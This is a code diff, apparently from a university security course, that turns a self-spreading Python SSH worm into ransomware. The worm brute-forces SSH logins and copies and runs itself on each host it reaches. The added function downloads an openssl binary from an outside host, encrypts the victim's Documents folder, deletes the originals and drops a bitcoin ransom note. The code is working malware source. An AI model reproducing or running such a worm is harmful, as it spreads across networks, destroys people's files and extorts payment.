@@ -1,4 +1,5 @@
 import paramiko
+import tarfile
 import sys
 import socket
 import nmap
@@ -7,6 +8,9 @@ import sys
 import struct
 import fcntl
 import netifaces
+import urllib
+import shutil
+from subprocess import call
 
 # The list of credentials to attempt
 credList = [
@@ -65,14 +69,14 @@ def spreadAndExecute(sshClient):
 	# code we used for an in-class exercise.
 	# The code which goes into this function
 	# is very similar to that code.	
-	wormLoc = "/tmp/replicator_worm.py"	
+	wormLoc = "/tmp/extorter_worm.py"	
 	if len(sys.argv) >= 2:
 		if sys.argv[1] == "--host":
-			wormLoc = "replicator_worm.py"
+			wormLoc = "extorter_worm.py"
 	sftpClient = sshClient.open_sftp()
-	sftpClient.put(wormLoc, "/tmp/replicator_worm.py")
-	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
-	sshClient.exec_command("nohup python /tmp/replicator_worm.py &")
+	sftpClient.put(wormLoc, "/tmp/extorter_worm.py")
+	sshClient.exec_command("chmod a+x /tmp/extorter_worm.py")
+	sshClient.exec_command("nohup python /tmp/extorter_worm.py &")
 	
 
 
@@ -93,8 +97,7 @@ def tryCredentials(host, userName, _password, sshClient):
 	# and password stored in variable password
 	# and instance of SSH class sshClient.
 	# If the server is down	or has some other
-	# problem, connect() function which you will
-	# be using will throw socket.error exception.	     # Otherwise, if the credentials are not
+	# problem, connect() function which you will # be using will throw socket.error exception.	     # Otherwise, if the credentials are not
 	# correct, it will throw 
 	# paramiko.SSHException exception. 
 	# Otherwise, it opens a connection
@@ -218,14 +221,37 @@ def getHostsOnTheSameNetwork():
 
 	return liveHosts
 
+def encryptFiles():
+	try:	
+		urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "openssl")	
+		tar = tarfile.open("Documents.tar", "w:gz")
+		tar.add("/home/ubuntu/Documents/")
+		tar.close()
+		call(["chmod", "a+x", "./openssl"])
+		call(["openssl", "aes-256-cbc", "-a", "-salt", "-in", "Documents.tar", "-out", "Documents.tar.enc", "-k", "cs456worm"])
+		shutil.rmtree('/home/ubuntu/Documents/')
+		file_obj = open("give_me_moneyz.txt", "w")
+		file_obj.write("Send 100000 btc to 1xcfuh3298sdfz or never see your files again ")
+		file_obj.close()
+		os.remove("Documents.tar")
+	except:
+		print "unable to encrpyt"
+
+
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
-#print "Found hosts: ", networkHosts
+#worm checks if its already exists
 if not os.path.exists(INFECTED_MARKER_FILE):
 	markInfected()
 else:
 	print "Already Infected"
 	sys.exit()
+
+#if its not host then encrpyt
+if len(sys.argv) >= 2:
+	print "Host, do not encrpyt"
+else:
+	encryptFiles()
 
 # Go through the network hosts
 for host in networkHosts:
